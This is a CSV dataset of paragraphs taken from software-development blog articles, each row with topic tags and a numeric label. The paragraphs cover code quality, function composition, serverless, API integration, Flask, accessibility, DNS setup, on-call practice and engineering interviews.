2220,Care certainly needs to be taken to introduce these types of changes into an organization. A healthy amount of empathy for these organizations is necessary to make any substantive change. These teams are facing organizational challenges and dysfunctions that have put them in this position to begin with. In order to be successful turning these organizations around it is of the utmost importance to start unraveling the myths about code quality. One of the first defenses of organizations holding on to problematic code and development practices is what I call the Code Quality vs. This is the completely incorrect belief that you cant care about both code quality and shipping code quickly.,"['Software Development', 'Refactoring', 'Software Engineering', 'Tdd', 'Clean Code']",12
2221,"This is something that Ive heard a lot throughout my career. Going into organizations with quality problems and trying to improve them will expose a lot of people claiming that caring about code quality is somehow unprofessional. That coding as fast as possible is the only responsibility of the professional developer, not self improvement, not mentoring junior developers, not improving the readability of the code. All of these things, they believe, are things that take time away from shipping. This is a natural result from working in what John Cutler refers to as a Feature Factory. An organization that is focused only on shipping new features not business outcomes or delighting customers. These types of organizations measure success by development team velocity, but fail to measure whether the features that were built were successful in meeting customers needs. His post about feature factories is fantastic, I highly recommend spending a few minutes to read it.","['Software Development', 'Refactoring', 'Software Engineering', 'Tdd', 'Clean Code']",12
2222,"Sometimes what these developers are really saying when claiming that they are too busy shipping is We dont have time to learn the skills to improve our code. In other cases, they just dont feel empowered by the organization to slow down and actually think about the problem. Their first software design idea is the one that will end up in production. Even once it becomes clear the design is flawed they continue to fight through it to force it to work. This process results in adding more cruft to the codebase to slow down the future developers. They are rewarded for releasing something on time without any consideration of the long term effects the code has on the rest of the organization. As I have said before, rewarding specific behaviors is one way organizations ensure that those behaviors will continue.","['Software Development', 'Refactoring', 'Software Engineering', 'Tdd', 'Clean Code']",12
2223,"Lets discuss the question around professionalism briefly mentioned in the previous section. There is typically a lot of blustering about how caring about code quality makes you unprofessional. These arguments stem from people not really understanding the cost of poorly written code. They think code quality is simply a matter of aesthetics. That it is purely subjective and theres no way to justify one developers preference for the code to be organized a certain way. People will try to argue that developers who care about quality just want to sit in a cube all day refactoring code, making it look pretty without ever shipping code to production or giving a single thought to the organizations commitments. This is the crux of the fallacy and one that is absolutely false. Ive heard more than once developers claim that they arent interested in falling in love with the code. Sadly these protestors miss the point of high quality code altogether.","['Software Development', 'Refactoring', 'Software Engineering', 'Tdd', 'Clean Code']",9
2224,"As Martin Fowler discusses in his talk Workflows of Refactoring, the argument around code quality and refactoring is a simple one. It is entirely an economics argument, the ability to deliver more functionality quicker. Developers are working in a world of changing requirements, feature enhancements, changes in team members, advancements in the understanding of the problem domain, etc. This requires the ability to read and change code easily for the lifetime of the software. The incredible thing about high quality codebases is that they are as easy to change on day one as they are on year ten. If the software is any more than a temporary prototype, a focus on quality is not only appropriate, it is the only professional option. In high quality codebases, building new features gets faster instead of slower over time because there are now well-tested software building blocks that can be combined to solve business problems.","['Software Development', 'Refactoring', 'Software Engineering', 'Tdd', 'Clean Code']",12
2225,"The last bullet point refers to code readability, which presents its own challenges. Since code will always be read and modified, being read far more times than modified in most cases, optimizing for these two activities is vital. If you believe a measure of software quality and clean code is its ability to convey intent to future developers, then every developer should focus on the readability of the code. Continuously trying to improve the code so that it is always in a state that is easily understood is not nitpicking. Selecting and updating names that convey the intent of the code must be a focus of development teams. Furthermore, these names should always be open to change as the understanding of the problem domain increases. All too often teams view this type of activity as wasted time and nitpicking.","['Software Development', 'Refactoring', 'Software Engineering', 'Tdd', 'Clean Code']",9
2226,"It is absolutely necessary to introduce developers to incremental improvement techniques. Whether it is Uncle Bob Martins Boy Scout Rule or Martin Fowlers Opportunistic Refactoring, the message is the same. Incrementally improve the quality of the code you are currently working on. For larger changes have a plan for where you want to go, and find incremental steps to get there. This is not an easy skill to learn by any means. But developers will only get better at this technique when they have opportunities to practice it.","['Software Development', 'Refactoring', 'Software Engineering', 'Tdd', 'Clean Code']",12
2227,"Now, Im not saying there arent reasons to make trade-offs or non-ideal decisions to get something into production quickly. However, poorly written and sloppy code is not that. Technical Debt has unfortunately come to mean any poor quality code or any kind of shortcut in code quality to get something done quickly. Ward Cunningham originally coined the phrase Technical Debt. I believe the first time it was referenced was in a paper from OOPSLA 92. According to Wards original definition, incurring technical debt required the code to be of high quality. It was necessary for it to remain easy to change so that the debt can be reversed easily in the future.","['Software Development', 'Refactoring', 'Software Engineering', 'Tdd', 'Clean Code']",9
2228,"I have interviewed hundreds of developers. What Ive learned from those sessions is that Im not alone. Very few working software developers have a good grasp on the essence of software development. They arent aware of the most important tools we have at our disposal, or how to put them to good use. 100% have struggled to answer one or both of the most important questions in the field of software development: What is function composition? The problem is that you cant avoid composition just because youre not aware of it. You still do itbut you do it badly. You write code with more bugs, and make it harder for other developers to understand. We spend more time maintaining software than we do creating it from scratch, and our bugs impact billions of people all over the world.","['JavaScript', 'Functional Programming', 'Oop', 'Technology', 'Composing Software']",0
2229,"Function composition is the process of applying a function to the output of another function. In algebra, given two functions, fand g, (f g)(x) = f(g(x)). The circle is the composition operator. It's commonly pronounced ""composed with"" or ""after"". You can say that out-loud as ""f composed with g equals f of g of x"", or ""f after g equals f of g of x"". We say f after g because g is evaluated first, then its output is passed as an argument to f.","['JavaScript', 'Functional Programming', 'Oop', 'Technology', 'Composing Software']",14
2230,"Composing functions intentionally, we can improve our do Stuff() function to a simple one-liner: A common objection to this form is that its harder to debug. For example, how would we write this using function composition? First, lets abstract that after f, after g logging into a little utility called trace(): Now we can use it like this: Popular functional programming libraries like Lodash and Ramda include utilities to make function composition easier. You can rewrite the above function like this: If you want to try this code without importing something, you can define pipe like this: Dont worry if youre not following how that works, yet. Later on well explore function composition in a lot more detail. In fact, its so essential, youll see it defined and demonstrated many times throughout this text. The point is to help you become so familiar with it that its definition and usage becomes automatic. Be one with the composition.pipe() creates a pipeline of functions, passing the output of one function to the input of another. When you use pipe() (and its twin, compose()) You do not need intermediary variables. Writing functions without mention of the arguments is called point-free style. To do it, you will call a function that returns the new function, rather than declaring the function explicitly. That means you will not need the function keyword or the arrow syntax (=>).","['JavaScript', 'Functional Programming', 'Oop', 'Technology', 'Composing Software']",9
2231,"The gorilla/banana problem: the problem with object-oriented languages is theyve got all this implicit environment that they carry around with them. You wanted a banana but what you got was a gorilla holding the banana and the entire jungle. ~ Joe Armstrong, Coders at Work The most common form of object composition in Java Script is known as object concatenation (aka mixin composition). You start with an object (like vanilla ice-cream), and then mix in the features you want. Add some nuts, caramel, chocolate swirl, and you wind up with nutty caramel chocolate swirl ice cream.","['JavaScript', 'Functional Programming', 'Oop', 'Technology', 'Composing Software']",9
2232,"Its time to simplify, and the best way to simplify is to get to the essence. The trouble is, almost nobody in the industry has a good handle on the essentials. We as an industry have failed you, the software developer. Its our responsibility as an industry to train developers better. Everything runs on software today, from the economy to medical equipment. There is literally no corner of human life on this planet that is not impacted by the quality of our software. We need to know what were doing.","['JavaScript', 'Functional Programming', 'Oop', 'Technology', 'Composing Software']",12
2233,"Googles search magic is created by the Web Graph inspired Page Rank algorithm, which is how it decides the order of the search results. One of the first major innovations of this algorithm was to use the number of links that point to particular page as an indicator of the page relevance. The other major innovation was the feedback loop between what the users are clicking and the position of that link in the page. This means that every time you click on a link in Google, you are voting with your answer and teaching Googles Page Rank algorithm. To see this in action, note how when you copy the link of an Google Search result, the link is not to the page you want to see. The link is to an google service that will capture and store your choice. It is the capture of this data that allows Google to benefit from network effects and provide custom search results to each user (yes, when you search for a particular topic, you will get different results than somebody else).","['Google', 'Generation Z', 'Developers']",14
2234,"The SRE (Site Reliability Engineering) is an amazing concept, that you as a developer really need to spend time learning and understanding how it works (specially how SREs behave). At Google, the SRE teams are the ones that deploy and maintain applications. There are many lessons that we can learn from Googles experience of deploying things at scale. For example I really like the SRE idea to spend 50% on doing X and 50% in improving the process + tools required to effective do that X. Error Budgets are another SRE concept which can make a massive difference in how applications are developed and tested. The SRE idea of Error Budget is that each application or service needs to provides a clear and objective metric of how unreliable that service is allowed to be within a single period of time.","['Google', 'Generation Z', 'Developers']",12
2235,"Browsers started becoming available that could render content that was being served by a computer somewhere else. It was really cool, because all of the sudden, anyone could serve content using from their own homes. Of course this came with a some limitations:speeds were slowwhen your siblings friends call, your server would go offline causing an complete outage for your service IP addresses would change all the time Still home computers were great for pet projects. Well they started hosting servers in their offices or garages. The challenge to make that information available at all times from anywhere in the world was on.","['Serverless', 'Software Development', 'Development', 'DevOps', 'Technology']",17
2236,"Fast forward a few more years. The Internet is part of everyday life, even produce have their own websites to tell you how amazing they taste. Many different avenues were investigated for ways to simplify the management of applications at scale. Virtual environments, virtual hosts within VMs, freebsd jails, solaris containers/zones to name a few. Sometime in 2008, Linux Containers made their appearance as LXC containers.","['Serverless', 'Software Development', 'Development', 'DevOps', 'Technology']",16
2237,"A few years later, Docker made its splash. Many still argue about the merits of what Docker did for containers. Whether they just got all the glory of containers because of their cute mascots. Or whether it was because of the tooling they provided to simplify the packaging and deployment of containers. Or whether they just invested a lot of work to build a solid open source community. Either ways, before Docker, containers just hadnt taken off.","['Serverless', 'Software Development', 'Development', 'DevOps', 'Technology']",10
2238,"Deploying in containers looks like this:create a container that will include an immutable runtime environment for your application as well the application code. In Docker, this is done via a Dockerfile. If you havent seen one, its a small amount of metadata that defines the contents of a containerbuild the container and deploy it via a container orchestrator or a Platform-as-a-Service. Any number of Platform-as-a-Service provider will allow you to deploy your application in minutes Containers proved it was possible to reduce the scope of what developers needed to worry about when deploying applications. They provided a simpler interface to shipping code directly into production. They also made it possible for platform providers to get creative. Platforms could improve the scalability of users applications. But what if developers could focus on even less? With serverless, its finally possible for application developers to really focus on the application code itself. In essence, a developer only needs to write an event handler in a single file of code to take advantage of serverless.","['Serverless', 'Software Development', 'Development', 'DevOps', 'Technology']",7
2239,"There are many ways to get started with serverless code. The easiest way to get started is to sign up with one of the cloud providers. Whether youre familiar with node, golang or python, most languages are already supported. Last week, Amazon announced the ability for users to bring their own runtime which increases the flexibility of serverless yet again. Here are just a few of the providers with links to getting started for each: AWS Lambda Getting Started Getting started with Google Cloud Functions Create your first function in the Microsoft Azure portal Getting started with IBM Cloud Functions This will save you some time setting up an environment. Each provider has a wealth of information on getting started if you just search for it. Most cloud providers have a f*cking around, no idea what Im doing or free tier to allow users to get started at no cost.","['Serverless', 'Software Development', 'Development', 'DevOps', 'Technology']",11
2240,"First, what the heck is a third party API? This was one of the first questions I asked my instructors during office hours when I started at The Grace Hopper Program at Fullstack. Even before jumping into programming, Ive heard the phrase API before. I knew tech giants like Facebook and Twitter had an API and that API stood for Application Programming Interface. But what did that even mean? Third party APIs can be thought of like a toolbox a company gives to developers to use and build with. Through simple calls, APIs allow developers access to data and certain technologies. For example, using the Spotify API, I can create a website that displays my Spotify playlist and plays it right in the browser through their music player. Which is really great because I wont need to build my own! Like open source software, third-party APIs highlight how collaborative coding can be. Rather than build from scratch every time, a developer can find an applicable third party API and give their own applications much more functionality. In that way, to me, they are akin to NPM libraries! If youre new to this, before we get started, make sure youve chosen the right API. Make sure youve found the best API for your use case. Make sure the API is well documented and well tested. Integrating an API that has a lot of documentation (and seemingly, a lot of steps) may take some time but the documentation will make the whole process much more simple. There are so many different APIs out there so do your research and find what works best for your own app. Check out this site to peruse some popular APIs.","['JavaScript', 'React Native', 'Plaid', 'API', 'Third Party Api']",19
2241,"Noteeach API is different and may have its own intricacies. For the purpose of this article, lets look at just one API, Plaid, and how to integrate it to a Create React Native application. Plaid enables applications to connect with users bank accounts, (which again highlights to me how useful and easy APIs can make programmingcomplex and highly sensitive data like banking information becomes easily, and safely, accessible to developers through an API.) Plaid is another example of great documentation. They even have a walkthrough app to get you started. *Our example is also a little distinct because were using a web API that doesnt have support for React Native in a Create React Native application. You can still do this without ejecting your CRNA and without writing anything in Objective C or Swift, all thanks to a handy dandy npm library, react-native-plaid-link. Get developer access to the API and register your application. Youll then get three API keys: a client_id, a secret, and public key. An API key is exactly what it sounds likea key for the developers app to get access to the entire API. In our example with Plaid, a client_id is a non-sensitive, public identifier that is used to initialize Plaid Link. A secret is a private identifier that is required for accessing any financial data. This should NEVER be in client-side codelets go ahead and save these three API keys in a __url__ file on our server-side application using process.env.2. In your routes file for all your Plaid requests, which Ive conveniently named plaid.js, lets require plaid. Lets also give our file access to our secrets. Plaid also gives you different environments to build in: sandbox, development, and production. When youre building your project, always work in sandbox.3. Now that weve initialized the Plaid client, we can access the different web endpoints and methods given to us the developers from Plaid. *Ill be VERY brief in this section because it has a lot more to do with Plaid Link in a React Native app than integrating a third party API to your application. If youre curious how it was done, be sure to check out the Capstone project (coming soon!).4. Connect your User to Plaid using Plaid Link. In your Link Component, render the Plaid Authenticator, imported from react-native-plaid-link.5. Send the public token to the backend via a thunk.","['JavaScript', 'React Native', 'Plaid', 'API', 'Third Party Api']",15
2242,"A User logs in to their bank account using Plaid Link and Plaid Authenticator, which returns a public token. Our client-side application sends that public token to our server-side application. Our server-side application converts that public token to an access token. Our server-side application now acts as a client and sends a request to the Plaid API/server for transactions based on that access token. Our server-side then receives the data and stores it in our server. Now, our client-side application can make requests for transactions directly to our server! APIs sound complicatedbut it really isnt. If youre a new developer starting to build their portfolio, youve probably already made a CRUD app. All you really need is an API key and you can make calls to the Web API endpoints rather than to your local host. Take your CRUD app to the next level by integrating some kind of API. Using APIs will really expand your world and your abilities.","['JavaScript', 'React Native', 'Plaid', 'API', 'Third Party Api']",11
2243,"While Ive seen React code in the past. Redux is quite a new and foreign territory for it. After a bit of research and poking around, it turns out redux is a state container. People tell me theres a strong and loving relationship between React and Redux. Here are some resources that will get you started on Redux.","['JavaScript', 'Technology', 'Productivity', 'Startup', 'Programming']",15
2244,"As the worlds leading Iaa S platform, AWS fully embraces Polyglot-Persistence-as-a-Service (no surprise!). App developers get the database API/model of their choice and the Operations teams dont have to manage the multitude of databases picked by the developers. However, this point of view is self-serving to say the least. AWS charges top $ for its managed database services and gets the most effective form of lock-in (operational data!). If Google Cloud, Microsoft Azure or a private cloud were to provide a lower cost solution at a higher performance, then good luck moving out of the AWS database services. At small scale these issues may be immaterial but mid-to-large enterprises running their entire business on the cloud would be short-sighted to ignore the economic benefits of the multi-cloud era we live in.","['Database', 'Dynamodb', 'NoSQL', 'Sql', 'Cosmosdb']",10
2245,"A seasoned Spring developer, I felt a bit uneasy when designing and future-proofing a Flask-based API for the first time. I have recently started using Python way beyond my original intention to just play with data, and found Flask to be a super-easy micro-service alternative to Spring Boot or Ktor. The one thing I was really concerned about, was making sure that the API request/response format was standardised (think, providing a Swagger schema), well-documented, and validated. While working with Java, much of this would come straight from the compiler itself, due to the static-type nature of the language. When you combine this with a couple of great libraries like Jackson and Spring Fox, the API communication gets documented and validated with minimal intrusion to the actual code. In Python, this would require tedious if-else checks all over the place.","['Flask', 'Python', 'Web Development', 'Rest Api', 'Articles']",15
2246,"Lets see how our tiny app will look after the transformations: With this tiny bit of overhead (if you even consider this any overhead at all), you get so much in return. Start the app and point to http://localhost:5000. You will see that the index page has turned into a Swagger UI, which shows the already defined API endpoints, neatly organised into categories (namespaces): This is great for documenting, playing with, and sharing you API schema around. Yet, this is by far not the only thing that Flask-Rest Plus does for you. It goes beyond simply documenting the API, in ensuring that the API is compliant with the schema. Put simply, Flask-Rest Plus makes sure that if certain request parameters are marked as mandatory, or if request/response models are supposed to have a certain structure, those are checked and validated at runtime. In my opinion, this is real advantage of Flask-Rest Plus, sitting on top of a Flask application. The current example is too simple to demonstrate the real power of request/response marshalling and validation, but both will be throughly described in Part 2.","['Flask', 'Python', 'Web Development', 'Rest Api', 'Articles']",6
2247,"Namespaces are optional, and add a bit of additional organisational touch to the API, mainly, from a documentation point of view. A namespace allows you to group related Resources under a common root, and is simple to create: To bring certain Resources under a given namespace, all you need to do, is to replace @api with @ns_conf. Notice also that the name of the namespace replaces the name of the resource, so endpoints can simply to refer to /, instead of copying the name of the resource time and again: One will notice afterwards that the Swagger UI display has changed too, to reflect the namespacing: Flask Blueprints are a popular way of designing modular applications. The same applies to Flask-Rest Plus. The production version of our application will certainly outgrow the four endpoints we started with. There might be other resources, or at the very least, you might want to move to move your API away from the root of your app. Both cases are a perfect candidate for a Blueprint. Lets move all of our API endpoints under /api/v1, without touching the routes of even one of them. This example is coming straight from the Flask-Rest Plus documentation, and is illustrative enough to help close this chapter of the journey: Create a Blueprint the usual way, and instead of wrapping our app instance with the Rest Plus API, we will wrap the Blueprint instead. This way, independent of our app, we are free to move our API part into a different module: (e.g. blueprint/api.py)This leaves only a tiny bit of bridging code to introduce the Blueprint to the main app, and set the URL prefix. The next time you start your app, the API endpoints will be accessible only under the specified URL prefix (/api/v1).","['Flask', 'Python', 'Web Development', 'Rest Api', 'Articles']",18
2248,"This is a very important question you should ask yourself as a web designer. But what is web accessibility and why is it so important? According to W3C WAI, web accessibility means that websites, tools, and technologies are designed and developed so that people with disabilities can use them. This basically means that anyone is able to understand and navigate on the internet and also be able to contribute in any way possible. For web designers, this means making your website accessible to anyone and making sure your experience isnt excluding anyone. This should definitely be a priority for any web designer, especially one who is interested in providing the best possible experience to all users! If you put yourself in someone with disabilities shoes, you can just imagine the frustration they must feel when they cant access the information in the same way we do.",['Accessibility'],19
2249,"So how do you use headings correctly? Well, it basically means to use the correct order of headings (h1, h2, h3, h4, h5, h6). For example, for the main title of a page, use the <h1> tag, not the <h2> or <h3> tags just because you like them more. Use the different headings to structure and organize your content, and make sure you dont skip any levels. This might confuse the screen readers trying to navigate on your site.",['Accessibility'],19
2250,"I had a neat little web adventure recently. It started with an email from Pingdom stating that my personal site was unreachable over https. I hosted my personal website, __url__ on Digital Ocean along with a few other sites for my family and friends behind Nginx using Certbot from EFF for free TLS certificates. This is all well and good except that for reasons I still have yet to figure out, every now and again (probably due to my crappy configuration) the Certbot would fail to renew the certificate and Id have to stop what I was doing and go manually fix it. I finally decided I didnt care enough to keep fixing this dumb host so I chose to update my site to use S3, Cloudfront and a certificate from AWS Certificate Manager (ACM). But My DNS is managed by Go Daddy.","['AWS', 'DNS', 'Godaddy', 'Route 53', 'Cloudfront']",11
2251,"Problems with Go Daddy For some background as to what I was trying to do. I have a Pingdom alert on __url__ notice the https and no www. Now when you create a Cloudfront distribution with a TLS certificate, it gives you a url with a __url__ domain. When you go to Go Daddy and try to manage your DNS pointing the Root of your site (they use the @ symbol) using a CNAME instead of an A record, you get a big fat error. Not using an A record for DNS should be totally allowed in a zone file, but for whatever reason Go Daddy doesnt support that. I called tech support to verify that as well and got a confused rep who didnt really know how DNS worked explaining that you must have an A record. The recommended approach was to set __url__ as a CNAME pointing to my Cloudfront distribution. Then create a redirect to www from the root domain (jryancanty.com).","['AWS', 'DNS', 'Godaddy', 'Route 53', 'Cloudfront']",7
2252,"This will probably work just fine for most sites but we can do better than that. What if we want the root of our site to point directly to Cloudfront. What if we dont want to use Go Daddy to manage our DNS at all?! Enter Route53Domain registration is a process by which a registrar such as Go Daddy negotiates with ICANN to register a domain name on your behalf. DNS services are offered by Go Daddy, but you dont have to use them. If you want more flexibility, scalability, etc. you could use another DNS service such as AWS Route53, Google Cloud DNS, NS1, etc. I picked Route53 since Im hosting things on Cloudfront.","['AWS', 'DNS', 'Godaddy', 'Route 53', 'Cloudfront']",11
2253,"First I needed to go to Route53 and create a Hosted Zone If you look closely you can see the list of name servers on the right. These are the servers that actually do the DNS resolution. Youll notice that they all have awsdns in their domain name since they are owned by AWS. If youre like me and used Go Daddy DNS your name servers will look something like: Take a look at that big ol Change button! You can in fact change who manages your DNS by clicking change and setting the name servers to the ones owned by AWS (Or Google or whoever). This process is not isolated to Go Daddy. Almost every domain name registrar and DNS provider gives you the ability to change who manages your DNS. Once you change your nameservers in this list, it should look like: This can take up to 24 hours to propagate fully. In that time, why dont we switch over to Route53 again and actually setup how we want our DNS to resolve our requests. Go ahead and click Create Record Set with the name of your domain name ( __url__ in my case) and type of A record. This is the kind of record that would typically point to an IP address. Click the Yes radio button for Alias. Assuming you already have a Cloudfront distribution setup with a valid ACM certificate, you should see your distribution in the dropdown for Alias Target. Select that and hit Save Record Set and youre off to the races.","['AWS', 'DNS', 'Godaddy', 'Route 53', 'Cloudfront']",11
2254,"There are two solutions for this: Step Function and Lambda Solution 1-Step Function. We can define a lambda function to check the status of a training job. Then we use a step function to call the lambda function (e.g. every 1 hour), once training is done, call another lambda function to deploy the model. This solution has been well-documented in this article __url__ deployment.","['AWS', 'Sagemaker', 'Amazon Sagemaker', 'Machine Learning']",15
2255,"Background I go primary on-call for the team every seven weeks. I have the same responsibilities of carrying the pager(duty) that everyone in the team has. If the system has issues at 2AM, I wake up and fix these issues doing the same analysis using the same tools as engineers on the team. I work through critical issues that risk systematic reliability that are found during on-call. I run the on-call handover for that week summarizing issues found, fixes and analysis in flight. These are all of the same responsibilities every engineer on the team holds once every seven weeks. What I dont do is handle our Slack and email user support during office hours. The team pitches in and does that support for me as I am in meetings most days and cannot reliably handle support issues that span more than 15 minutes. The team sees this as a fair trade-off of not having to carry the pager during this week.","['Product Management', 'Product', 'Product Development', 'Software Development', 'Software Engineering']",0
2256,"Bad (Selfish) Reason #1: I miss complex system analysis I decided to move into management a little over a year and a half ago. I have focused on analysis of complex codebases for most of my career, specifically performance engineering. I love tearing apart codebases I do not know and working to make them more performant and scalable. While on-call analysis isnt exactly this, with the complexity of our infrastructural services, the approach is similar. I found when I was an engineer on-call that I loved taking a new problem peeling back the layers of the system until root cause was identified. I found extreme technical joy in working through these problems on systems of our scale. While, as a manager, this isnt a good reason to stay on call, I do it selfishly as my passion for analysis is satisfied once every seven weeks.","['Product Management', 'Product', 'Product Development', 'Software Development', 'Software Engineering']",12
2257,"Good Reason #1: Empathy As a manager, I invest a great deal of energy into the product manager for our service. Good product managers should have empathy for their users and customers. When Im on-call, I get a good idea of how well the system is working from our users perspective. I can make informed trade offs between new feature work and taking down technical debt that is impacting happiness with existing features. One could argue that I could listen intently during on-call handovers to get the same signal. I have found it hard to get to that level of understanding without being deeply involved once every so often. The reason for this is that our team is so well connected during the week that not doing the job means you lose context to participate in the discussions.","['Product Management', 'Product', 'Product Development', 'Software Development', 'Software Engineering']",0
2258,"This perspective ensures I am empathetic with the team. Not only will I be far more supportive of pulling back when we need to, but I also feel the level of burn out the team has to deal with. On-call, when done well, shouldnt burn out the on-call engineer. On-call, when done poorly, always burns out the entire team. When I feel burned out during an on-call, you can be sure Ill be looking at committing to new features more sparingly. Transitively this helps the team stay healthy as well.","['Product Management', 'Product', 'Product Development', 'Software Development', 'Software Engineering']",0
2259,Good Reason #2: Hiring This approach also helps tremendously during hiring. I would say half of the engineers talking to me about career opportunities ask me about on-call and burn out. I can answer directly with I was on call last week. Let me tell you about the issues and how much time I spent. I am very proud to discuss openly how we handle systemic reliability of our service. Many candidates that ask about on-call are doing so as they are burnt out. They are burnt out on on-call as their services havent invested in taking down tech debt in similar ways to our team. I specifically look for engineers who are excited to join a team that is directly on-call for their service and can demonstrate either experience or thought based software engineering approaches to take on reliability issues with a global and fast growing service.,"['Product Management', 'Product', 'Product Development', 'Software Development', 'Software Engineering']",0
2260,"Ive been asked if being on-call is the best use of my time. Obviously, I believe it is even with my one selfish reason. Also, people tend to assume that on-call comes at the expense of other important aspects managers spend time on at Netflix (things like user outreach, strategy and recruiting engineering talent). The fact is, since the team covers my daily responsibilities, it doesnt get in the way much. In some cases, where there is a systemic reliability issue that drags on from night time coverage to day time support or a day time page occurs, it does impact my office hours work. However, given we are making sure these cases are exceptional, it is worth the trade-off occasionally. Also, if the issues do drag on, I understand clearly how much they are impacting developers time as well.","['Product Management', 'Product', 'Product Development', 'Software Development', 'Software Engineering']",0
2261,"I also realize that for some managers it might be harder to get into on-call. Given I helped on early implementations of our service, I know the technology well. I simply stayed on-call when I transitioned into management. My advice for managers that want to be in this position would be shadow on-call for a while, working with the operational tools along with your team to the point where you feel comfortable that youd be able to solve a problem at 2AM. I am not advocating for all managers to stay on call. For me it was a personal choice that aligned well with the needs of my team and my passion and almost a requirement when the team size was 3 engineers. When the time comes where I am no longer able to do on-call up to the team standards due to expanded workload, I plan to invest in keeping a close eye on the reliability of the service as well as the personal health of on-call members. For managers who arent on-call today, it is super important to keep track of these signals as part of being a great product manager.","['Product Management', 'Product', 'Product Development', 'Software Development', 'Software Engineering']",0
2262,"Heres what __url__ says: Youve seen this effect in the Fluent Design Systems Acrylic Material as well as in i OS. If you wanted to bring this effect into your designs on the web, well, you had to hex your users into using only Safari, and of course you didnt because youre a good wizard, we know. This is because Safari was the only browser that supported backdrop-filter out of the box. With the April 2018 release of Windows, Edge 17 supports backdrop-filter using the -webkit prefix.backdrop-filter is still very new and if it had widespread browser adoption, this article would be a very short one consisting of the following: Put this on your CSS element if you want to blur whatever is behind itbackdrop-filter: blur(20px);Of course, if your element has a solid color background, you wont see any difference, so make sure youre using a color formula (RGBA, HSLA, etc) where you can control the opacity like so: But this only works in Safari. To get that goodness in Edge, use the -webkit prefix: Of course, a quick trip to __url__ confirms something we might already know: this only works in Edge and Safari (and i OS). Firefox and Chrome dont support it yet, so well have to use a fallback for that.","['Web Development', 'Microsoft', 'Design', 'Fluent Design System']",19
2263,"While running some entity analyses on the content present for a random entity, Vi Senze, we started to notice that the company name is not being typed correctly. It is essentially being lumped into the Other bucket. This is an issue because clearly Googles Natural Language API is not identifying the company name as being that of an organization, or an entity in its own right.2. Next, youll notice that no Wikipedia page is listed in the results. Out of curiosity, we queried to see if Vi Senze had a Knowledge Graph present in Google search. They did, however, it is very bare bones as youll see below.3. Why is the Knowledge Graph so bare? The chief reason is because Google does not have a reliable Vi Senze Wikipedia page to source valuable content from. As a result, only the most basic company information is included in the Knowledge Graph.","['Programming', 'Python', 'Machine Learning', 'Google Cloud Platform', 'SEO']",8
2264,"Looking in the project folder you cloned from my Git Hub repository, you should see a few different files:2 txt files ~ gnl-direct-check and gnl-bulk-check. These are the files where you will input either URLs (bulk check) or insert text directly (direct check).1 Python file ~ gnl-main-module. This is the program where youll run analyses from.1 folder ~ gnl-separate-modules. This is just a folder of each separate GNL method modules for reference, they do not interact with the program at all.2. Once youve placed the URLs or text you want to analyze into their respective text files, open the program Python file in your code editor of choice. Its important to note that the folder with the files should be placed in the folder that the code editor is pointing to. You can typically find this path in the editors terminal. You can change this path in the editor, but its easier just to place the files in the directory its already pointing.3. Once you run the program, youll be given the option to run the analyses in bulk or direct. Simply type in the option of your choice.4. After entering the option of your choice and hitting enter, youll be given a list of the GNL methods to choose from. Each analysis corresponds with a letter in parentheses, so just enter the letter of the analysis you want to run in the prompt.","['Programming', 'Python', 'Machine Learning', 'Google Cloud Platform', 'SEO']",7
2265,"NOTE ~ For the bulk option, youll notice that there are only four options compared to the direct options five. The reason is that Ive removed the Syntax Analysis option from bulk because it would create very unwieldy results if analyzing many URLs. I may add back at some point if deemed valuable.5. There are a few key differences on how the processes are conducted depending on whether you analyze in bulk or direct. With the bulk option, the program uses Beautiful Soup to scrape all available p tags from the page. This is done since best practice is to have all content located within these tags. Obviously, this means that heading tags are not included or text not included in p tags. Because web pages generally contain a lot of messy code that gets in the way, I opted to only collect p tag content to make the program more scalable across different domains. From the tests Ive run, this seems to collect most of the important content anyways. If the pages youre analyzing have a different structure, use the direct method instead to collect everything.","['Programming', 'Python', 'Machine Learning', 'Google Cloud Platform', 'SEO']",19
2266,"When running the Content Classification option for bulk, you may see a few instances of an error about too few tokens. This occurs when the content located within a given p tag is less than 20 words (tokens). If the page content you are analyzing is somewhat short, run it in the direct option to ensure it can be analyzed in full.6. Once an analysis finishes executing, youll see a prompt asking if you want to run another analysis. Answer by simply entering either Y or N. If Y, you will be returned to the GNL method choice screen. If N, the program will finish executing.","['Programming', 'Python', 'Machine Learning', 'Google Cloud Platform', 'SEO']",15
2267,"There continues to be a lot of discussion concerning the best way to interview software engineers. Many articles have been written debating the merits of asking interview candidates to write code on a whiteboard (though there are an even larger number of articles on how best to improve ones chances of acing such an interview) or discussing the benefits or drawbacks of asking engineers to solve logic puzzles. All of these discussions are trying to optimize the identification of the right software engineer for the job and often posit that while these types of questions may not actually help the interviewer directly understand how well the candidate will perform on the job, they are a reasonable-enough heuristic. Yes, they argue, it may take us a little longer to hire someone than wed like, but well incur the associated financial and opportunity costs resulting from that delay. After all, they go on, its okay if a few good software engineers fall through the cracks, because its much more important to ensure the process never allows a substandard software engineer to successfully make it through the interview process. Well never make that mistake again! Its understandable that this would be an important topic of conversation as software development is increasingly important to a wider variety of companies. As a result, building a great software engineering team is critical to the success of many more companies, and the best way to interview software engineers is a top priority.","['Interviewing', 'Software Engineering', 'Hiring', 'Management And Leadership']",0
2268,"A good interview of a software engineering candidate will cover both technical skills (i.e., programming and software engineering) and soft skills (i.e., cultural fit, teamwork, communication, conflict resolution, etc.) as both are necessary for a software engineer to be a successful member of an engineering team. For soft skills, I still rely on the approach I was first exposed to while I was an engineering manager at Sun Microsystems nearlyahem!20 years ago (while other big tech companies were pushing the merits of relying on those brain teaser and logic puzzle-based interview questions). This principle behind this approach can be stated as follows: This clearly works well for those soft skills as we can ask questions such as, Tell me about a time when you disagreed with a colleague. How did you resolve the situation? But what about the technical skills required of a good software engineer? It may come as a surprise, but we can use this same principle to gain insight into whether or not the candidate is a good software engineer. We just have to create the similar situations ourselves.","['Interviewing', 'Software Engineering', 'Hiring', 'Management And Leadership']",0
